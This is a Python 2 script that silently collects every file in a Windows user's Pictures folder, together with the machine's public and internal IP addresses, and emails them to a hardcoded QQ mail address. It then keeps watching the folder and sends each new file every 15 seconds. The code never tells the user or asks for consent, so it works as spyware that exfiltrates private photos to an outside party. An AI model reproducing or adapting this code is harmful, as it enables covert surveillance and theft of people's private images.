#default is windows os

#given the default dir is Pictures

import os
import time
import socket
import sys
import threading
from urllib2 import urlopen

import email_client

current_public_ip = urlopen('http://ip.42.pl/raw').read()
current_inner_ip = socket.gethostbyname(socket.gethostname())
current_time = time.strftime("%Y-%m-%d %H:%M:%S")


target_email = "848334436@qq.com"
subject = "From %s computer" %current_public_ip
content = current_time +"\r %s" %current_inner_ip

current_time = time.strftime("%Y-%m-%d %H:%M:%S")

sys_init_time = 0
last_send_time = 0
execute_time = 15 #one day to execute


def _init(pic_path):
    print "System initing....\r"

    for path in pic_path:
        files = os.listdir(path)
        def generate_abs_path(f):
            return path+"\\"+f

        abs_files_name = map(generate_abs_path,files)

        email_client.mail(target_email,
           subject,
           content,
           abs_files_name)

    sys_init_time = time.time()
    global last_send_time
    last_send_time = sys_init_time
    print "System initing send time %s" %last_send_time
    print "System inited at %s.\r" %time.strftime("%Y-%m-%d %H:%M:%S")

def _single_file_monitor(f):
    global last_send_time
    f_create_time = time.mktime(time.strptime(time.ctime(os.path.getctime(f)),"%a %b %d %H:%M:%S %Y"))
    if (f_create_time - last_send_time) > 0:
        print "File %s created at %s\r"%(f,f_create_time)
        print "Last Send Time %s" %last_send_time
        return True
    else:
        return False

def _running(pic_path):
    flag = True
    files_to_send = []
    send_times = 1
    while flag:
        updated_files = []
        for path in pic_path:
            files = os.listdir(path)

            def generate_abs_path(f):
                return path+"\\"+f

            abs_files_name = map(generate_abs_path,files)

            for f_name in abs_files_name:
                if _single_file_monitor(f_name):
                    updated_files.append(f_name)
                else:
                    print "File %s will not be sent twice\r" %f_name

            if updated_files == []:
                print "Entering wait condition"
            else:
                email_client.mail(target_email,
                   subject,
                   content,
                   updated_files)
                send_times += 1
            global last_send_time
            last_send_time = time.time()
            print "File sent at %s \r" %time.ctime()

        print "System sleep %s seconds" %execute_time

        print "System has sent %s mails" %send_times
        time.sleep(execute_time)




if __name__ == '__main__':
    pic_path = os.path.join(os.path.expandvars("%userprofile%"),"Pictures")

    handle_path = []
    handle_path.append(pic_path)
    _init(handle_path)

    threading.Thread(target=_running(handle_path)).start()
